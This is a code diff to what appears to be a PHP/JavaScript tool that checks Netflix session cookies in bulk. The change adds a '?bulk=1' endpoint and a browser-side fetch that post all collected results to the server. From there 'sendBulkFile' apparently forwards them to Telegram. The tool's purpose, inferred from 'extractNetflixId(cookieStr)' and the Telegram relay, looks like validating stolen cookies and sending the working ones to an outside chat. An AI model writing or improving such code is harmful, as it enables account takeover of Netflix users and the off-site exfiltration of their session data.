@@ -86,6 +86,22 @@ function sendBulkFile($text) {
     return $response;
 }
 $bulkResults = [];
+
+// ✅ HANDLE BULK SEND (ADD THIS HERE)
+if (isset($_GET['bulk']) && $_GET['bulk'] == 1) {
+
+    $raw = file_get_contents('php://input');
+    $data = json_decode($raw, true);
+
+    if (!empty($data['bulk'])) {
+        $finalText = "📦 BULK RESULTS\n\n" . $data['bulk'];
+        sendBulkFile($finalText);
+    }
+
+    echo json_encode(["status" => "bulk_sent"]);
+    exit;
+}
+
 //ORIGINAL
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
@@ -149,12 +165,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         //sendToTelegram($msg); // 🔥 instant send
         $bulkResults[] = $msg;
     }
-
-// ✅ SEND TELEGRAM BEFORE EXIT
-if (!empty($bulkResults)) {
-    $finalText = "📦 BULK RESULTS\n\n" . implode("\n\n", $bulkResults);
-    sendBulkFile($finalText);
-}
 
 // return API response
 http_response_code($http_code);
@@ -1747,9 +1757,22 @@ exportData.push(
         document.getElementById('btnProgressText').textContent = 'Processing...';
         }, 1200);
         unlockInputs(); // 🔓 UNLOCK UI
+    // 🔥 SEND BULK TO BACKEND (ADD THIS HERE)
+     if (exportData.length > 0) {
+        fetch(window.location.href + "?bulk=1", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            bulk: exportData.join("\n\n")
+        })
+    });
+}
+// EXISTING CODE
     if (exportData.length > 0) {
     document.getElementById('exportBtn').disabled = false; // 🔓 enable
-} // closes if
+    } // closes if    
 } // 🔥 THIS LINE IS THE IMPORTANT ONE (closes startApiTest)        
     function extractNetflixId(cookieStr) {
     if (!cookieStr) return 'N/A';
